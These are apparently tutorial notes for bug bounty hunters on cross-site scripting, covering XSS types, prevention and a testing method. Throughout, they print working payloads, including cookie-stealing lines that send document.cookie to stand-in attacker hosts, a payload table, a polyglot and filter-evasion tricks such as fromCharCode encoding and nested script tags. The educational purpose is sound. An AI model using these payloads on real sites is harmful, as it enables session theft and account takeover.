An XXS vulnerability occurs when an attacker executes a custom script on the users browser. 
These attacks inject their code onto pages being viewed by other uses and can lead to things like leaking personal information, stealing cookies, changing site content, and or redirect the user to a malicious site. 
## Mechanisms
The attacker injects a script into webpages that users view, in order to understand XSS we first need to understand HTML and Javascript syntax.
Web pages are made up of HTML code that describe the pages structure and contents.

```html
<html>
	<h1>Welcome to my web page.</h1>
	<p>Thanks for visiting!</p>
</html>
```

HTML also allows us to embed images within pages, create user-input forms, link to external pages, and perform various other tasks.
It also allows us to execute scripts inside of HTML documents, its used to control client side application logic to create an interactive experience. 

```html
<html>
	<script>alert("Hello!");</script>
	<h1>Welcome to my web page.</h1>
	<p>Thanks for visiting!</p>
</html>
```

This script creates a pop-up message on the webpage that says `Hello!`.
This is called an `inline script` and are the cause for many XSS vulnerabilities. 

```html
<html>
	<script>alert("Hello!");</script>
	<h1>Welcome to my site.</h1>
	<h3>This is a cybersecurity newsletter that focuses on bug bounty news and write-ups. Please subscribe to my newsletter below to receive new cybersecurity articles in your email inbox.</h3>
	<form action"/subscribe" method="POST">
		<label for="email">Email:</label><br>
		<input type="text" id="email" value="Please enter your email.">
		<br><br>
		<input type="submit" value="Submit">
	</form>
</html>
```

This page contains a form that lets users subscribe to a newsletter.
After a users inputs their email the website confirms it by displaying it on the screen: 
```html
<p>Thanks! You have subscribed <b>example@gmail.com</b> to newsletter.</p>
```

What if the user decides to input a script instead of an email address? 

```html
<script>location="http://attacker.com";</script>
```

If the web application doesn't validate or sanitize the input before displaying the confirmation message the source code for the page would change.

```html
<p>Thanks! You have subscribed <b><script>location="http://attacker.com";</script></b> to newsletter.</p>
```

Validating user input means that the web app checks that the user input meets a certain standard. 
It should change special characters in the input that could be used as a means to interfere with our HTML logic. 
The example were seeing now would cause the user to be redirected to a malicious site.
XSS happens when attackers inject scripts in this way onto a page that another user is visiting. 

```html
<script src=http://attacker.com/xss.js></script>
```

Attackers can also manipulate the `src` attribute in HTML to load javascript files from external sources to execute in the users browser.
This example isn't really possible since there is no way to inject a script but they can redirect themselves to a malicious page. 

```html
http://subscribe.example.com?email=<script>location="http://attacker.com";</script>
```

However lets say the site also allows users to subscribe to the newsletter by visiting a URL, after they visit they will be subscribed, the confirmation will be shown on the users browser.
Attackers can inject a script that included in the link, the browser will think that the script is part of the actual website. 
The script could access resources stored on the browser like cookies and session tokens resulting in your information being stolen and possibly losing access to user accounts. 

```html
<script>image = new Image();
image.src='http://attacker_server_ip/?c='+document.cookie;</script>
```

This example of an XSS attack sends a request to the attack with the victims cookie as a URL parameter. 
## Types of XSS
There are 3 kinds of XSS attacks and the factor that differentiates them is how the payload travels before it gets delivered to the user. 
There are also a few XSS flaws that fall into their own special categories. 
#### Stored XSS
Occurs when the user input is stored on a server and retrieved unsafely.
The app doesn't validate user input, it stores it on its server and renderings it without being sanitized.
This is the most severe type of XSS attack, potential of attacking many or all users, only viewing the page is required to suffer this attack.
Attackers manage to permanently save their malicious code on the server for others to access.
We could see things like databases being affected, accessing server logs, etc.
For example a user can submit code in a comment field that could alter the page if the input isn't properly sanitized. 

```html
<script>alert('XSS by Drew')</script>
```

Submitting this code would be updated to look like this.

```html
<h2>Andrew's message</h2>
<p>What a great post! Thanks for sharing.</p>
<h2>Attacker's message</h2>
<p><script>alert('XSS by Drew')</script></p>
```

The comment field will display as blank but its running whatever code you type between the script tags, every time a user visits this page the malicious code will execute. 
Upon submitting it would become embedded on the forums pages HTML code.
#### Blind XSS
A blind XSS is a type of stored XSS vulnerability, the input is stored on the server and executed in another part of the app or is executed in a different app. 
For example a page that lets you send a message to support staff, the input is not sanitized and its rendered on the admin page. 
Harder to detect but just as dangerous as normal stored XSS, cant find them by looking for input reflected in the servers response. 
Used to attack administrators, extract their data, and take over their accounts. 
#### Reflected XSS
Occurs when the user input is returned to the user without being sent to the database, the data gets processed on the server side and returned to the user.
These issues happen when the server relies on user input to create pages that display search results or error messages. 
For example a user inputing a search term for a URL parameter, the page displays the term at the top of the results page. 

```html
<h2>You searched for abc; here are the results!</h2>
```

If the search displays user-submitted search strings on the result page search terms like the following would cause a code injection and would be executed in the victims browser upon visiting.
```html
https://example.com/search?q=<script>alert('XSS Attack')</script>
```

If an attacker can get a user to visit this URL the payload will be embedded on the page being viewed.
Victims browser executes whatever the attacker wants to do.
Reflected XSS allows attackers to execute code when users click their malicious link. 
#### DOM Based XSS
User input never leaves the browser, everything happens on the client side of the application, its all frontend. 
DOM (Document Object Model) is the model that the browser uses to render a web page, its how websites are structured. 
The attack goes after the local copy of the web page that exists in the victims browser, it avoids going through the server. 
The DOM can be attacked when the page takes in user data to dynamically alter the DOM based on that input, Javascript libraries like jQuery are prone to DOM based XSS attacks. 
Attackers send DOM based XSS payloads through the victims user input, it executes code that directly modifies the local source code. 

```php
https://example.com?locale=north+america
```

The pages client side code will use this locale to welcome the user.

```html
<h2>Welcome, user from north america!</h2>
```

The URL parameter isn't submitted to a server its used locally by the users browser to directly update the local DOM.
And the input isn't validated, attackers will use this to create malicious links.

```html
https://example.com?locale=<script>location='http://attacker_server_ip/?c='+document.cookie;</script>
```

This will embed the payload on the user's web page, the victims browser will execute the code.
These attacks happen when user input is rendered in an insecure manner. 
URL fragments are strings located at the end of a URL that begin with the `#` character, its used to automatically direct users to a specific section of the webpage or to transfer additional data. 

```php
https://example.com#about_us
```

This URL with a fragment takes the user to the `#about_us` section of the website they are visiting. 
#### Self XSS
This attack is based around tricking users into submitting inputs that are malicious payloads themselves.
For example, a field on a users dashboard is vulnerable to a stored XSS attack, since only the victim can see and edit it the attacker has to way to get at it. 
They would have to trick the user to changing the value into the XSS payload. 
Like a social media post telling you to paste a piece of code into your browser to get something cool, this was most likely aimed at tricking you into launching an XSS attack against yourself. 
Attackers embed a piece of malicious payload in the link and hid it using a URL shortener like `bit.ly`
This involves social engineering which is not usually a thing that is accepted as a valid submission in bug bounty programs. 
## Prevention
To prevent an XSS attack an application should implement two controls, Robust Input Validation and  Contextual Output Escaping And Encoding.
A server should validate that user submitted input does not contain any dangerous characters.
For example an input containing `<script>` tells us it contains an XSS payload. 
In this case the server could block the request or sanitize the input by removing or escaping the special characters before its processed. 
`Escaping` refers to the practice of encoding special characters so they end up interpreted literally instead of as special characters.
For example if the user input is inserted into `<script>` then we know it needs to be encoded in a Javascript format.
In `HMTL` the left and right brackets can be encoded as `&lt` and `&gt` to prevent XSS, the app should be escaping characters that have an important meaning in its specific format.
Escaping ensures that the browser wont misinterpret these characters as code to be executed.
This is what most modern applications do to prevent XSS.
The app should be doing this for every piece of user input that gets rendered or accessed by a users browser. 
To prevent DOM based XSS apps should avoid code that rewrites HTML document based on user input, needs to be a client side input validation mechanism before it touches the DOM.
Set the `HttpOnly` flag on sensitive cookies that your site uses to prevent them from being stolen and implement the `Content-Security-Policy` HTTP response header, allows you to restrict how resources such as Javascript load your web pages. 
## Hunting For XSS
Look for XSS in places where user input gets rendered, for different types of XSS the process will vary but the concept remains the same: check for reflected user input.
#### Step 1: Look For Input Opportunities
First look for opportunities to submit user input to the target site.
If your attempting stored XSS look for places where input is stored by the server and later displayed to the user which includes comment fields and user profiles.
Types of inputs most often reflected are forms, search boxes, and sign up fields. 
Even if you cant insert the payload in a browser you could do it directly in the request.
Turn on your proxy's traffic interception and modify the request before forwarding it to the server.

```
POST /edit_user_age

(Post request body)
age=20
```

For example a user input that only accepts numeric values on the web page using this `age` parameter in the `POST` request. 

```
POST /edit_user_age

(Post request body)
age=<script>alert('XSS Attack');</script>
```

You can still try to submit an XSS payload by intercepting the request and changing its value. 
Edit the values in burp on the Proxy tab, after editing forward the request to the server.
For reflected DOM XSS look for URL parameters, fragments, or pathnames that get displayed.
A good way to start is insert a custom string into each URL parameter and check of its returned on the page. 
For example use a string like `XSS_BY_DREW` so you know your input was the cause of it. 
When it shows up, inspect the pages source code, it'll give you an idea of which user input fields appear in the resulting web page. 
#### Step 2: Insert Payloads
You can start injecting a test XSS payload at the injection point.

```html
<script>alert('XSS By Drew');</script>
```

This is the simplest payload, upon success you should see an alert box appear.
However this wont work on most applications, they usually implement XSS protection on their input fields. As XSS defenses become stronger so must the payloads we submit.
###### More Than A Script Tag
A script tag isn't the only method, you can also change the attributes found in HTML tags to run scripts if specific conditions are met.

```php
<img onload=alert('The image has been loaded') src-"example.png">
```

The `onload` attribute runs the script after the HTML element has loaded
The `onclick` runs a script when the element is clicked
The `onerror` runs a script if an error occurred loading the element. 
Take advantage of these elements or add a new event attribute onto an existing tag you can create an XSS attack.
You can also use special URL schemes like `javascript:` and `data:` to execute code in a specified URL.

```php
javascript:alert('XSS By Drew')
```

If you make a user load a `javascript:` URL you can achieve an XSS.
`data:` URLs allow you to embed small files into a URL.

```php
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
```

This URL will generate an alert box because the data included is a base64-encoded version of the following script.

```html
<script>alert('XSS By Drew')</script>
```

Documents contained within `data:` URLs don't need to be base64-encoded.
You can embed javascript directly into the URL as follows. 

```php
data:text/hmtl, <script>alert('XSS By Drew')</script>
```

You can use these URLs to trigger XSS when a site allows URL input from users.

```php
https://example.com/upload_profile_pic?url=IMAGE_URL
```

A site might allow a user to load an image by using a URL and use it as their profile picture. The app will then render a preview on the page by inserting the URL into an `<img>` tag. If you insert Javascript or data URL you can trick the victims browser to load your XSS.

```html
<img src="IMAGE_URL" />
```

There is more information on ways to execute JS code to bypass XSS protection, different browsers also support different tags and event handlers.
Always test by using multiple XSS browsers when hunting for XSS.
###### Closing Out HTML Tags
Its required to close the previous HTML tag before starting a new one to avoid causing an syntax error. 
If you don't the browser will not correctly interpret the payload. 

```html
<img src="USER_INPUT">
```

To close out the tag the payload has to include the ending of an `<img>` tag before the javascript

```html
"/><script>location="http://attacker.com";</script>
```

The resulting injection will appear as

```html
<img src=""/><script>location="http://attacker.com";</script>">
```

This payload closes the string that was to contain the user input, then it closes the `<img>` tag, the payload injects a complete string after the `<img>` tag.
You can inspect the source code, look for unclosed tags or syntax errors.
Check your browsers console and see if there are any errors loading the page. 
###### Common XSS Payload
| Payload                               | Purpose                                                                                                                          |
| ------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `<script>alert(1)</script>`           | Most generic XSS payload, generates a pop up box if successful                                                                   |
| `<iframe src=javascript:alert(1)>`    | Loads javascript code in an iframe, useful when script tags are banned by the XSS filter                                         |
| `<body onload=alert(1)>`              | Useful when input strings cant contain the term script, inserts an HTML element that runs Javascript code when its loaded        |
| `"><img src=x onerror=prompt(1);>`    | Closes out the previous tag, it injects an image tag with an invalid src URL. When the tag fails to load it will run the payload |
| `<script>alert(1)<!-`                 | This payload will comment out the rest of the line in the HTML doc to prevent syntax errors                                      |
| `<a onmouseover"alert(1)">test</a>`   | Inserts a link that will cause Javascript to run after user hovers over the link                                                 |
| `<script src=//attacker.com/test.js`> | Causes the browser to load and run an external script hosted on the attackers server                                             |
Hackers have designed many more creative ways to create XSS payloads, Search `XSS payloads` online for more ideas. 
A polyglot type of XSS payload that executes in multiple contexts, regardless of if its inserted into an `<img>` or a script `<script>`. 

```html
javascript:"/*\"/*`/*' /*</template>
</textarea></noembed></noscript></title>
</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```

This is setup so that if one fails it still has more chances to try another means, it is the beyond the scope for a beginner. 
Use a generic test string instead of XSS payloads such as `>'<"//:=;!--` and take note of which characters that application does and doesn't escape. 
Its then we can start to construct our payload based on characters that aren't being properly sanitized. 
Blind XSS flaws are hard to detect, try and make a victims browser make a request to a server of your own. 

```html
<script src='http://YOUR_SERVER_IP/xss'></script>
```

Then your able to monitor your server logs to see if anyone made a request.
If found, then a blind XSS has been triggered. 
#### Step 3: Confirm The Impact
Check your payload on the destination page, check if your means of signaling for an XSS like an alert box has been triggered. 
Your payload could be used to construct other things in the future such as web pages, emails, and file portals. Time delays are also pretty common. 
Sometimes a payload is triggered only during specific conditions such as an admin being logged in or a user interacts with specific HTML elements. 
Confirm the impact of the XSS payload by browsing the necessary pages and performing those actions. 
## Bypassing XSS Protection
Most apps include XSS protection in their input fields, they'll use a blocklist to filter out dangerous expressions that could pose an XSS vulnerability. 
#### Alternative Javascript Syntax
`<script>` tags are often sanitized in user input, if so try executing XSS that doesn't include us using a script tag. 
In some cases you can specify javascript to run in other types of tags.
You can also try to insert code into HTML tag names or attributes. 

```html
<img src="USER_INPUT">
<img src="/><script>alert('XSS by Vickie');</script>"/>
```

Closing out the image tag and inserting a script tag to execute code passed into the `src` attribute.

```html
<img src="123" onerror="alert('XSS By Drew');" />
```

You can just insert code directly into an attribute.

```html
<a href="javascript:alert('XSS by Vickie')>Click me!</a>"
```

This click me link will generate an alert box when clicked. 
#### Capitalization And Encoding
You can mix different encodings and capitalizations to confuse the XSS filter.
If a filter is looking out for the "script" string, try to capitalize some of the letters in the payload.

```html
<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
```

If the app filters characters like single and double quotes you cant write any strings into your payload directly, try and use the `fromCharCode()` function to create the string you need. 

```html
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
```

The function returns a string, given an input lost of ASCII character codes. 
#### Filter Logic Errors
Exploiting errors in the filter logic, some times they remove all `<script>` tags from the input to prevent XSS but it only does that once.

```html
<scrip<script>t>
location='http://attacker_server_ip/c='+document.cookie;
</scrip</script>t>
```

Each `<script>` tag cuts another `<script>` tag in half, the filter wont recognize them as legitimate tags but once the filter removes the intact tags from the payload the rendered input becomes a valid piece of javascript code. 

```html
<script>location='http://attacker_server_ip/c='+document.cookie;</script>
```

check out OWASP’s XSS filter evasion cheat sheet
## Escalating The Attack
The type of XSS determines the number of users who could be affected.
Stored XSS on a public forum could attack anyone who visits the forum.
Reflected or DOM XSS can only affect  users who click malicious links.
Self XSS requires a lot of user interaction and social engineering.
Make sure to assess the full impact of the particular XSS to include in your vulnerability report. 
## Automating XSS Hunting
Can be a very time consuming process but there are tools and resources we can use to improve our work.
Use browser developer tools to look for syntax errors  and troubleshoot payloads. 
Use proxy's search tool to search server responses for reflected input.
If the program your targeting allows for automatic testing you can use Burp Intruder or other fuzzers to conduct an automatic XSS scan on the target. 
## Finding Your First XSS

1. Look for where user input is stored and used to construct a web page, test its input field for stored XSS. If input in a URL is reflected back on the resulting page, test for reflected and DOM XSS. 
2. Insert payloads into the input field, from lists online, polyglot payload or generic test string. 
3. Check if the browser runs the code to confirm the impact or see if you can make the browser generate a request to your server. 
4. If your payloads don't execute try bypassing XSS protections. 
5. Automate the XSS hunting process. 
6. Consider the impact of the XSS thats been found, can you escalate the attack?
7. Send your XSS report to the bug bounty program. 
